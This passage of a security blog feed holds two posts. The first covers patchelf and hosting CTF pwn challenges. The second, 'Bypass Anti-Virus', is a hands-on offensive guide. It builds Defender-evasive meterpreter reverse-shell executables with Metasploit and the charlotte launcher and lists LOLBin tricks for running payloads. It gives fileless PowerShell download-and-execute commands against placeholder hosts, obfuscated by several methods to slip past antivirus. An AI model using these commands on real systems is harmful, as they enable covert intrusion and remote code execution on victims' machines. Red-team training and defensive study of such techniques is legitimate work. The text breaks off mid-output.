<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># apt </span><br><span class="line">$ sudo apt install patchelf </span><br><span class="line"></span><br><span class="line"># or compile by yourself </span><br><span class="line">$ ./bootstrap.sh</span><br><span class="line">$ ./configure</span><br><span class="line">$ make</span><br><span class="line">$ make check</span><br><span class="line">$ sudo make install</span><br></pre></td></tr></table></figure>
<p>Choose the dynamic loader (“ELF interpreter”) of executables</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ patchelf --set-interpreter /lib/my-ld-linux.so.2 my-program</span><br></pre></td></tr></table></figure>
<p>Change (or shrink) the <code>RPATH</code> of executables and libraries</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># set `RPATH`</span><br><span class="line">$ patchelf --set-rpath /opt/my-libs/lib:/other-libs my-program</span><br><span class="line"># shrink `RPATH`: get rid of useless `RPATH`</span><br><span class="line">$ patchelf --shrink-rpath my-program</span><br><span class="line"># cooperate with `--allowed-rpath-prefixes`</span><br><span class="line">$ patchelf --shrink-rpath --allowed-rpath-prefixes /usr/lib:/foo/lib my-program</span><br></pre></td></tr></table></figure>
<p>More on <a class="link"   href="https://github.com/NixOS/patchelf/blob/master/README.md" >README.md<i class="fas fa-external-link-alt"></i></a></p>
<h2 id="Host-Pwn-Challenges"><a href="#Host-Pwn-Challenges" class="headerlink" title="Host Pwn Challenges"></a>Host Pwn Challenges</h2><p>Most of the time we debug locally due too the speed and other facters, but the exploit scripts sometimes goes wrong when testing on remote dur to details in interaction. </p>
<p>Here introduces several ways to host the <code>pwn</code> challenges, not only for <code>CTF</code> competition organizers but facilitate <code>CTFers</code> to test <code>remote</code> on <code>local</code>.</p>
<h3 id="One-Command"><a href="#One-Command" class="headerlink" title="One Command"></a>One Command</h3><p>In real challenge we are given an <code>ip</code> and a <code>port</code>, therefore the easiest way is to do port forwarding using <code>socat</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ socat tcp-l:8080,fork exec:/root/pwn_to_run,reuseaddr</span><br></pre></td></tr></table></figure>
<p>Then you can <code>nc</code> to interact. </p>
<p>Add <code>nohup</code>, even combine with <code>screen</code>&#x2F;<code>&amp;</code> will helps.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ nohup socat tcp-l:8080,fork exec:/root/pwn_to_run,reuseaddr</span><br></pre></td></tr></table></figure>


<h3 id="ctf-xinetd"><a href="#ctf-xinetd" class="headerlink" title="ctf_xinetd"></a><a class="link"   href="https://github.com/Eadom/ctf_xinetd" >ctf_xinetd<i class="fas fa-external-link-alt"></i></a></h3><blockquote>
<p>A docker repository for deploying CTF challenges</p>
</blockquote>
<p><code>xinetd</code> - the extended Internet services daemon. It starts programs that provide Internet services.<br><code>xinetd</code> is the only daemon process started and it listens on all service ports for the services listed in its configuration file.<br><code>ctf_xinetd</code> uses <code>docker</code> to run <code>xinetd</code> and host the pwn challenge. </p>
<p>The brief <a href="https://github.com/Eadom/ctf_xinetd/blob/master/README.md"><code>README.md</code></a> comes</p>
<hr>
<ul>
<li>Configuration</li>
</ul>
<p>Put files to floder <code>bin</code>. They’ll be copied to &#x2F;home&#x2F;ctf. <strong>Update the flag</strong> at the same time.</p>
<p>Edit <code>ctf.xinetd</code>. replace <code>./helloworld</code> to your command.</p>
<p>You can also edit <code>Dockerfile, ctf.xinetd, start.sh</code> to custom your environment.</p>
<ul>
<li>Build</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ docker build -t <span class="string">&quot;helloworld&quot;</span> .</span><br></pre></td></tr></table></figure>

<p>DO NOT use <em>bin</em> as challenge’s name</p>
<ul>
<li>Run</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ docker run -d -p <span class="string">&quot;0.0.0.0:pub_port:9999&quot;</span> -h <span class="string">&quot;helloworld&quot;</span> --name=<span class="string">&quot;helloworld&quot;</span> $ helloworld</span><br></pre></td></tr></table></figure>

<p><code>pub_port</code> is the port you want to expose to the public network.</p>
<ul>
<li>Capture traffic</li>
</ul>
<p>If you want to capture challenge traffic, just run <code>tcpdump</code> on the host. Here is an example.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ tcpdump -w helloworld.pcap -i eth0 port pub_port</span><br></pre></td></tr></table></figure>

<h3 id="pwn-deploy-chroot"><a href="#pwn-deploy-chroot" class="headerlink" title="pwn_deploy_chroot"></a><a class="link"   href="https://github.com/giantbranch/pwn_deploy_chroot" >pwn_deploy_chroot<i class="fas fa-external-link-alt"></i></a></h3><blockquote>
<p>A project for deploying ctf pwn challenge use chroot</p>
</blockquote>
<p>Since <a href="https://github.com/Eadom/ctf_xinetd"><code>ctf_xinetd</code></a> needs to modify <code>flag</code>, <code>ctf.xinetd</code>, and only deploys one challenge a time, another convenient tool <a href="https://github.com/giantbranch/pwn_deploy_chroot"><code>pwn_deploy_chroot</code></a> comes.</p>
<p><a href="https://github.com/giantbranch/pwn_deploy_chroot"><code>pwn_deploy_chroot</code></a> is able to deploy multiple challenges in one <code>docker</code> machine, and generate <code>flag</code> &amp; configurations automatically.<br>Replacing <code>/bin/sh</code> in <code>chroot</code> with statically linked <code>catflag</code> gives users no chance to use <code>sh</code> fork bombs. Ports starts from <code>10000</code>, +1 for each additional program.</p>
<p>Come the brief <a href="https://github.com/giantbranch/pwn_deploy_chroot/blob/master/README.md"><code>README.md</code></a></p>
<hr>
<ul>
<li>Before</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Install the latest version docker</span><br><span class="line">$ curl -s https://get.docker.com/ | sh</span><br><span class="line"># Install docker compose</span><br><span class="line">$ apt install docker-compose</span><br></pre></td></tr></table></figure>

<ul>
<li>How to use</li>
</ul>
<ol>
<li>Put your pwn program to .&#x2F;bin （Note that the filename should not contain special characters.）</li>
<li>python initialize.py</li>
<li>docker-compose up –build -d     # please run as root</li>
</ol>
<p>You can edit <code>config.py</code> to decide whether to replace <code>/bin/sh</code> with <code>catflag</code></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Whether to replace /bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## replace</span></span><br><span class="line">REPLACE_BINSH = <span class="literal">True</span></span><br><span class="line"><span class="comment">## not replace(default)</span></span><br><span class="line">REPLACE_BINSH = <span class="literal">False</span></span><br></pre></td></tr></table></figure>

<ul>
<li>Attention</li>
</ul>
<p>The flag will be generated by the <code>initialize.py</code> and it store in <code>flags.txt</code></p>
<p>The port information of the pwn program is also inside the <code>flags.txt</code>.</p>
<ul>
<li>Update</li>
</ul>
<p>2018.09.17 version v1</p>
<p>2018.09.23 version v2：Use the catflag program instead of &#x2F;bin&#x2F;sh, which is more secure</p>
]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>gdb</tag>
        <tag>libc</tag>
      </tags>
  </entry>
  <entry>
    <title>Bypass Anti-Virus</title>
    <url>/2021/08/02/2021-08-02-Bypass-Anti-Virus/</url>
    <content><![CDATA[<p>Techniques of bypassing antivirus are developing rapidly, and this article shows some practical tools&#x2F;tips.</p>
<h2 id="General"><a href="#General" class="headerlink" title="General"></a>General</h2><p>Actually years age just modifying some special strings or add rubbish paddings at the end makes antivirus confused about the sample, but for now only encryption and obfuscation works, sometimes we even need to explore more native APIs to bypass and this can be still temporary.</p>
<p>What I want to show here is not about detailed information, but some easy-to-use tools which help red teaming. For some hardcore learners, check <a class="link"   href="https://github.com/Ascotbe/virus/tree/master/ShellCode" >this<i class="fas fa-external-link-alt"></i></a> out.</p>
<h3 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a><a class="link"   href="https://github.com/rapid7/metasploit-framework" >Metasploit<i class="fas fa-external-link-alt"></i></a></h3><p>In <a href="/2020/03/17/2020-03-17-MSF-Pentest-Route/">MSF Pentest Route</a> I introduced pretty much about metasploit framework penetration testing, only to forget the <code>Evasion</code> module which updated in Metasploit 5.0.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 &gt; show evasion</span><br><span class="line"></span><br><span class="line">Evasion</span><br><span class="line">=======</span><br><span class="line"></span><br><span class="line">   #  Name                                                 Disclosure Date  Rank    Check  Description</span><br><span class="line">   -  ----                                                 ---------------  ----    -----  -----------</span><br><span class="line">   0  evasion/windows/applocker_evasion_install_util                        normal  No     Applocker Evasion - .NET Framework Installation Utility</span><br><span class="line">   1  evasion/windows/applocker_evasion_msbuild                             normal  No     Applocker Evasion - MSBuild</span><br><span class="line">   2  evasion/windows/applocker_evasion_presentationhost                    normal  No     Applocker Evasion - Windows Presentation Foundation Host</span><br><span class="line">   3  evasion/windows/applocker_evasion_regasm_regsvcs                      normal  No     Applocker Evasion - Microsoft .NET Assembly Registration Utility</span><br><span class="line">   4  evasion/windows/applocker_evasion_workflow_compiler                   normal  No     Applocker Evasion - Microsoft Workflow Compiler</span><br><span class="line">   5  evasion/windows/process_herpaderping                                  normal  No     Process Herpaderping evasion technique</span><br><span class="line">   6  evasion/windows/windows_defender_exe                                  normal  No     Microsoft Windows Defender Evasive Executable</span><br><span class="line">   7  evasion/windows/windows_defender_js_hta                               normal  No     Microsoft Windows Defender Evasive JS.Net and HTA</span><br></pre></td></tr></table></figure>
<p>Try to use one</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 &gt; use evasion/windows/windows_defender_exe</span><br><span class="line">[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 evasion(windows/windows_defender_exe) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (evasion/windows/windows_defender_exe):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   FILENAME  mikXxir.exe      yes       Filename for the evasive file (default: random)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST     172.21.180.162   yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Evasion target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Microsoft Windows</span><br><span class="line"></span><br><span class="line">msf6 evasion(windows/windows_defender_exe) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Compiled executable size: 3584</span><br><span class="line">[+] mikXxir.exe stored at /root/.msf4/local/mikXxir.exe</span><br></pre></td></tr></table></figure>
<p>Then we get a default meterpreter reverse shell at <code>/root/.msf4/local/mikXxir.exe</code></p>
<h3 id="Veil"><a href="#Veil" class="headerlink" title="Veil"></a><a class="link"   href="https://github.com/Veil-Framework/Veil/" >Veil<i class="fas fa-external-link-alt"></i></a></h3><p>As this installation requires <code>wine</code> and part of graph GUI, so remember to install a desktop environment (I’m talking to <code>WSL</code> users).</p>
<p>As for usages, follow the lead in banner and the parameters are similar to <code>msf</code>.</p>
<h3 id="charlotte"><a href="#charlotte" class="headerlink" title="charlotte"></a><a class="link"   href="https://github.com/9emin1/charlotte" >charlotte<i class="fas fa-external-link-alt"></i></a></h3><blockquote>
<p>13&#x2F;05&#x2F;2021:</p>
<ol>
<li>c++ shellcode launcher, fully undetected 0&#x2F;26 as of 13th May 2021.</li>
<li>dynamic invoking of win32 api functions</li>
<li>XOR encryption of shellcode and function names</li>
<li>randomised XOR keys and variables per run</li>
<li>on Kali Linux, simply ‘apt-get install mingw-w64*’ and thats it!</li>
</ol>
</blockquote>
<p>Usage:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/9emin1/charlotte.git &amp;&amp; apt-get install mingw-w64*</span><br><span class="line">$ <span class="built_in">cd</span> charlotte</span><br><span class="line">$ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<span class="variable">$YOUR_IP</span> LPORT=<span class="variable">$YOUR_PORT</span> -f raw &gt; beacon.bin</span><br><span class="line">$ python charlotte.py</span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line"><span class="comment"># banners</span></span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line">[*]                    Initialising charlotte()                    [*]</span><br><span class="line">[*]                    Generating XOR Keys...                      [*]</span><br><span class="line">[*]                    Replacing data <span class="keyword">in</span> template.cpp...           [*]</span><br><span class="line">[*]                    charlotte.cpp generated!                    [*]</span><br><span class="line">[*]                    Completed - Compiling charlotte.dll         [*]</span><br><span class="line">[*]                    Cross Compile Success!                      [*]</span><br><span class="line">[*]                    Removing charlotte.cpp...                   [*]</span><br><span class="line">[*]                    Execute on your Windows x64 victim with:    [*]</span><br><span class="line">[*]                    rundll32 charlotte.dll, ebBpZJRjZOCeIR    [*]</span><br></pre></td></tr></table></figure>
<p>On victim:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">&gt; download `charlotte.dll` first (wget, curl, powershell, certutil)</span><br><span class="line">&gt; rundll32 charlotte.dll, ebBpZJRjZOCeIR    <span class="comment"># get it online</span></span><br></pre></td></tr></table></figure>
<p>Finally online and no AV detects.</p>
<h2 id="White-list"><a href="#White-list" class="headerlink" title="White list"></a>White list</h2><p>Includes some LOLBins(Living-Off-the-Land Binaries). These gadgets are always <code>Windows</code> native softwares, with legal digital signs and some acts as components of middleware in <code>Windows</code> </p>
<h3 id="forfiles"><a href="#forfiles" class="headerlink" title="forfiles"></a>forfiles</h3><p>It executes one command to operate batch of files.<br><code>/p</code> sets folder to search files, <code>/m</code> sets keywords, and <code>/c</code> sets command</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">&gt; forfiles /p c:\windows\system32 /m calc.exe /c C:\path\to\payload.exe</span><br></pre></td></tr></table></figure>

<h3 id="pcalua"><a href="#pcalua" class="headerlink" title="pcalua"></a>pcalua</h3><p>A component of Windows Program Compatibility Assistant, <code>-a</code> to execute.</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">&gt; pcalua.exe <span class="literal">-a</span> C:\path\to\payload.exe</span><br></pre></td></tr></table></figure>

<h3 id="SyncAppvPublishingServer"><a href="#SyncAppvPublishingServer" class="headerlink" title="SyncAppvPublishingServer"></a>SyncAppvPublishingServer</h3><p>It has <code>vbs</code> and <code>exe</code> versions.</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">&gt; SyncAppvPublishingServer.vbs <span class="string">&quot;n; Start-Process C:\path\to\payload.exe&quot;</span></span><br></pre></td></tr></table></figure>
<p>Using <code>regsvr32</code> to execute remote scripts.</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">&gt; SyncAppvPublishingServer.vbs <span class="string">&quot;Break; regsvr32 /s /n /u /i:http://x.x.x.x:xxxx/xxx.sct scrobj.dll&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="Cmd-Hijack"><a href="#Cmd-Hijack" class="headerlink" title="Cmd Hijack"></a>Cmd Hijack</h3><p>Use path traversing to confuse monitoring system</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">&gt; cmd.exe /c <span class="string">&quot;ping 127.0.0.1/../../../../../../../../../../windows/system32/calc.exe&quot;</span></span><br></pre></td></tr></table></figure>
<p>Other 2 methods:</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">&gt; ping ;calc.exe <span class="number">127.0</span>.<span class="number">0.1</span>/../../../../../../../../../../windows/system32/WindowsPowerShell/v1.<span class="number">0</span>/POWERSHELL.EXE</span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">cmd.exe /c <span class="string">&quot;ping ;calc.exe; 127.0.0.1/../../../../../../../../../windows/system32/WindowsPowerShell/v1.0/POWERSHELL.EXE&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="conhost-exe"><a href="#conhost-exe" class="headerlink" title="conhost.exe"></a>conhost.exe</h3><p>Console Host Process, the host of console</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">&gt; conhost.exe C:\path\to\payload.exe</span><br><span class="line">&gt; conhost <span class="string">&quot;C:\path\to\payload.exe&quot;</span> </span><br><span class="line">&gt; conhost C:/path/to/payload.exe</span><br></pre></td></tr></table></figure>

<h3 id="explorer-exe"><a href="#explorer-exe" class="headerlink" title="explorer.exe"></a>explorer.exe</h3><p>Familiar to it</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">&gt; explorer.exe C:/path/to/payload.exe </span><br><span class="line">&gt; explorer.exe /root,<span class="string">&quot;C:/path/to/payload.exe&quot;</span> </span><br><span class="line">&gt; explorer.exe pentestlab.blog, <span class="string">&quot;C:/path/to/payload.exe&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="waitfor"><a href="#waitfor" class="headerlink" title="waitfor"></a>waitfor</h3><p>Sync pc in internet communication using signals</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">&gt; waitfor pentestlab &amp;&amp; PowerShell <span class="built_in">IEX</span> (<span class="built_in">IWR</span> http://x.x.x.x/xxx).Content </span><br><span class="line">&gt; waitfor /s <span class="number">127.0</span>.<span class="number">0.1</span> /<span class="built_in">si</span> pentestlab</span><br></pre></td></tr></table></figure>

<h3 id="InstallUtil-exe"><a href="#InstallUtil-exe" class="headerlink" title="InstallUtil.exe"></a>InstallUtil.exe</h3><p>X86</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">&gt; C:\Windows\Microsoft.NET\Framework\v4.<span class="number">0.30319</span>\InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll</span><br></pre></td></tr></table></figure>
<p>X64</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">&gt; C:\Windows\Microsoft.NET\Framework64\v4.<span class="number">0.3031964</span>\InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll</span><br></pre></td></tr></table></figure>
<h3 id="Regsvcs-exe"><a href="#Regsvcs-exe" class="headerlink" title="Regsvcs.exe"></a>Regsvcs.exe</h3><p>X86</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">&gt; C:\Windows\Microsoft.NET\Framework\v4.<span class="number">0.30319</span>\regsvcs.exe AllTheThings.dll</span><br></pre></td></tr></table></figure>
<p>X64</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">&gt; C:\Windows\Microsoft.NET\Framework64\v4.<span class="number">0.30319</span>\regsvcs.exe AllTheThings.dll</span><br></pre></td></tr></table></figure>
<h3 id="Regasm-exe"><a href="#Regasm-exe" class="headerlink" title="Regasm.exe"></a>Regasm.exe</h3><p>X86</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">&gt; C:\Windows\Microsoft.NET\Framework\v4.<span class="number">0.30319</span>\regasm.exe /U AllTheThings.dll</span><br></pre></td></tr></table></figure>
<p>X64</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">&gt; C:\Windows\Microsoft.NET\Framework64\v4.<span class="number">0.30319</span>\regasm.exe /U AllTheThings.dll</span><br></pre></td></tr></table></figure>
<h3 id="Regsvr32-exe"><a href="#Regsvr32-exe" class="headerlink" title="Regsvr32.exe"></a>Regsvr32.exe</h3><p>X86</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">&gt; regsvr32 /s /u AllTheThings.dll --&gt; Calls DllUnregisterServer</span><br></pre></td></tr></table></figure>
<p>X64</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">&gt; regsvr32 /s AllTheThings.dll --&gt; Calls DllRegisterServer</span><br></pre></td></tr></table></figure>
<h3 id="Rundll32-exe"><a href="#Rundll32-exe" class="headerlink" title="Rundll32.exe"></a>Rundll32.exe</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">&gt; rundll32 AllTheThings.dll,EntryPoint</span><br></pre></td></tr></table></figure>
<h3 id="Msiexec"><a href="#Msiexec" class="headerlink" title="Msiexec"></a>Msiexec</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">&gt; C:\Windows\System32\msiexec.exe /q /i http://ip:port/beta.txt</span><br></pre></td></tr></table></figure>




<h3 id="Bypass-UAC"><a href="#Bypass-UAC" class="headerlink" title="Bypass UAC"></a>Bypass <code>UAC</code></h3><p>Check <a class="link"   href="https://github.com/hfiref0x/UACME" >UACME<i class="fas fa-external-link-alt"></i></a> for rich <code>UAC</code> bypassing materials.<br>Under <code>Source</code> folder there are:</p>
<ul>
<li><code>Akagi</code>, x64&#x2F;x86-32 main executable file, contain payload&#x2F;data units.</li>
<li><code>Akatsuki</code>, x64 payload, WOW64 logger.</li>
<li><code>Fubuki</code>, x64&#x2F;x86-32 payload, general purpose.</li>
<li><code>Kamikaze</code>, data, MMC snap-in.</li>
<li><code>Naka</code>, x64&#x2F;x86-32 compressor for other payload&#x2F;data units.</li>
<li><code>Yuubari</code>, x64 UAC info data dumper.</li>
</ul>
<h2 id="Multiple-Programming-Language"><a href="#Multiple-Programming-Language" class="headerlink" title="Multiple Programming Language"></a>Multiple Programming Language</h2><h3 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h3><p><code>Powershell</code> has 6 execution policies:</p>
<ol>
<li>Unrestricted:    the highest authority, with no limit on any script execution</li>
<li>Restricted:      default policy, any script execution is not allowed</li>
<li>AllSigned:       all scripts need to be signed before running</li>
<li>RemoteSigned:    no limit for local, but requires signs when from online</li>
<li>Bypass:          without any restrictions</li>
<li>Undefined:       no policy for scripts</li>
</ol>
<p>The default one is <code>Restricted</code> and we can use <code>Get-ExecutionPolicy</code> to get current policy.<br>With <code>Administrator</code> privilege we can use <code>Set-ExecutionPolicy Unrestricted</code> to get highest execution policy, then we are able to run any powershell scripts. To recover, use <code>Set-ExecutionPolicy Restricted</code>.</p>
<p>Now we think about bypass execution policy to run scripts when it is <code>Restricted</code>.</p>
<p>With a file:</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">&gt; powershell <span class="built_in">Get-Content</span> test.ps1 | powershell <span class="literal">-NoProfile</span> -</span><br><span class="line">&gt; powershell <span class="literal">-ExecutionPolicy</span> bypass <span class="operator">-File</span> ./test.ps1</span><br><span class="line">&gt; powershell <span class="literal">-ExecutionPolicy</span> unrestricted <span class="operator">-File</span> ./test.ps1</span><br></pre></td></tr></table></figure>
<p>To be fileless (like scripted web delievery in <code>Cobalt Strike</code>):</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">&gt; powershell.exe <span class="literal">-nop</span> <span class="literal">-w</span> <span class="keyword">hidden</span> <span class="literal">-c</span> <span class="string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://x.x.x.x:xxx/a&#x27;))&quot;</span></span><br></pre></td></tr></table></figure>
<p>But these are just bypassing execution policy, what about bypassing AV?</p>
<hr>
<ul>
<li>Command Obfuscation</li>
</ul>
<p>If we run that directly</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">&gt; powershell.exe <span class="literal">-nop</span> <span class="literal">-w</span> <span class="keyword">hidden</span> <span class="literal">-c</span> <span class="string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://x.x.x.x:xxx/a&#x27;))&quot;</span></span><br></pre></td></tr></table></figure>
<p>We get caught due to <code>IEX</code> usage (<code>IEX</code> -&gt; Invoke-expression), so get it an alias <code>iii</code></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">&gt; powershell <span class="built_in">set-alias</span> <span class="literal">-name</span> iii <span class="literal">-value</span> <span class="built_in">Invoke-Expression</span>;iii(<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;http://x.x.x.x:xxx/a&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>Or use <code>echo</code></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">&gt; <span class="built_in">echo</span> <span class="built_in">Invoke-Expression</span>(<span class="built_in">new-object</span> net.webclient).downloadstring(<span class="string">&#x27;http://x.x.x.x:xxx/a&#x27;</span>) | powershell -</span><br></pre></td></tr></table></figure>
<p>Or use <code>+</code> to split and concat variables</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">&gt; powershell  <span class="literal">-c</span> <span class="string">&quot;IEX(New-Object Net.WebClient).&quot;</span>DownloadString<span class="string">&quot;(&#x27;ht&#x27;+&#x27;tp://x.x.x.x:xxx/a&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>Code Obfuscation</li>
</ul>
<p>When we run <code>Powershell -ExecutionPolicy Bypass -File ./payload.sp1</code> to execute payload that <code>Cobalt Strike</code> generated, it will be detected by AV.</p>
<p>We can try <code>base64</code> encoding to encode the whole string that this original payload loads to run, and load it by decoding first in new payload. Replace it as:</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$base64</span><span class="literal">-decoded</span><span class="literal">-var</span>=[<span class="type">System.Text.Encoding</span>]::UTF8.GetString([<span class="type">System.Convert</span>]::FromBase64String(<span class="variable">$base64</span><span class="literal">-encoded</span><span class="literal">-string</span>))</span><br></pre></td></tr></table></figure>
<p>And dont forget to change related variable names. Then run <code>Powershell -ExecutionPolicy Bypass -File .\payload.sp1</code> to get it online and bypassing AV.</p>
<ul>
<li><a class="link"   href="https://github.com/danielbohannon/Invoke-Obfuscation" >Invoke-Obfuscation<i class="fas fa-external-link-alt"></i></a></li>
</ul>
<p>This is a powershell obfuscation framework on <a class="link"   href="https://github.com/danielbohannon/Invoke-Obfuscation" >github<i class="fas fa-external-link-alt"></i></a> and often used by APT32.</p>
<p>Load&#x2F;import it and run:</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">&gt; <span class="built_in">Import-Module</span> ./<span class="built_in">Invoke-Obfuscation</span>.psd1 </span><br><span class="line">&gt; <span class="built_in">Invoke-Obfuscation</span></span><br></pre></td></tr></table></figure>
<p>We can see the banner<br>![Invoke-Obfuscation](&#x2F;imghost&#x2F;bav&#x2F;Invoke-Obfuscation Screenshot.png)</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># set target first</span></span><br><span class="line"><span class="built_in">Invoke-Obfuscation</span>\Encoding&gt; <span class="built_in">SET</span> SCRIPTPATH <span class="built_in">Invoke-Obfuscation</span>/<span class="built_in">Out-SecureStringCommand</span>.ps1</span><br><span class="line"></span><br><span class="line">Successfully <span class="built_in">set</span> ScriptPath:</span><br><span class="line"><span class="built_in">Invoke-Obfuscation</span>/<span class="built_in">Out-SecureStringCommand</span>.ps1</span><br><span class="line"></span><br><span class="line"><span class="built_in">Invoke-Obfuscation</span>&gt; encoding</span><br><span class="line"></span><br><span class="line">Choose one of the below Encoding options to APPLY to current payload:</span><br><span class="line"></span><br><span class="line">[*] ENCODING\<span class="number">1</span>          Encode entire command as ASCII</span><br><span class="line">[*] ENCODING\<span class="number">2</span>          Encode entire command as Hex</span><br><span class="line">[*] ENCODING\<span class="number">3</span>          Encode entire command as Octal</span><br><span class="line">[*] ENCODING\<span class="number">4</span>          Encode entire command as Binary</span><br><span class="line">[*] ENCODING\<span class="number">5</span>          Encrypt entire command as SecureString (AES)</span><br><span class="line">[*] ENCODING\<span class="number">6</span>          Encode entire command as BXOR</span><br><span class="line">[*] ENCODING\<span class="number">7</span>          Encode entire command as Special Characters</span><br><span class="line">[*] ENCODING\<span class="number">8</span>          Encode entire command as Whitespace</span><br><span class="line"></span><br><span class="line"><span class="built_in">Invoke-Obfuscation</span>\Encoding&gt; <span class="number">1</span></span><br><span class="line"></span><br><span class="line">Executed:</span><br><span class="line">  <span class="built_in">CLI</span>:  Encoding\<span class="number">1</span></span><br><span class="line">  FULL: <span class="built_in">Out-EncodedAsciiCommand</span> <span class="literal">-ScriptBlock</span> <span class="variable">$ScriptBlock</span> <span class="literal">-PassThru</span></span><br><span class="line"></span><br><span class="line">Result:</span><br><span class="line"> <span class="operator">-JOin</span> ( <span class="string">&#x27;35z32h32M32X84f104f105f115;32z102;</span></span><br><span class="line"><span class="string"> ...</span></span><br><span class="line"><span class="string"> 101z119p83f99p114-105p112M116M13h10X125&#x27;</span> <span class="operator">-SPlIT</span><span class="string">&#x27;z&#x27;</span> <span class="operator">-SpLit</span> <span class="string">&#x27;;&#x27;</span><span class="operator">-spLit</span><span class="string">&#x27;M&#x27;</span><span class="operator">-spLIT</span><span class="string">&#x27;B&#x27;</span> <span class="operator">-spLIT</span><span class="string">&#x27;h&#x27;</span> <span class="operator">-Split</span><span class="string">&#x27;-&#x27;</span> <span class="operator">-SpLIT</span> <span class="string">&#x27;s&#x27;</span><span class="operator">-split</span><span class="string">&#x27;X&#x27;</span> <span class="operator">-SpLIT</span> <span class="string">&#x27;p&#x27;</span> <span class="operator">-SPlit</span><span class="string">&#x27;f&#x27;</span>| <span class="built_in">FoReaCh-OBjECt</span> &#123; ([<span class="built_in">CHAr</span>] [<span class="built_in">INT</span>]<span class="variable">$_</span>) &#125;)| <span class="built_in">IEx</span></span><br><span class="line"></span><br><span class="line">WARNING: This command exceeds the cmd.exe maximum length of <span class="number">8190</span>.</span><br><span class="line">         Its length is <span class="number">87052</span> characters.</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="built_in">Invoke-Obfuscation</span>\Encoding&gt; out <span class="number">2</span>.ps1</span><br><span class="line"></span><br><span class="line">Successfully output ObfuscatedCommand to C:\path\to\<span class="built_in">Invoke-Obfuscation</span>\<span 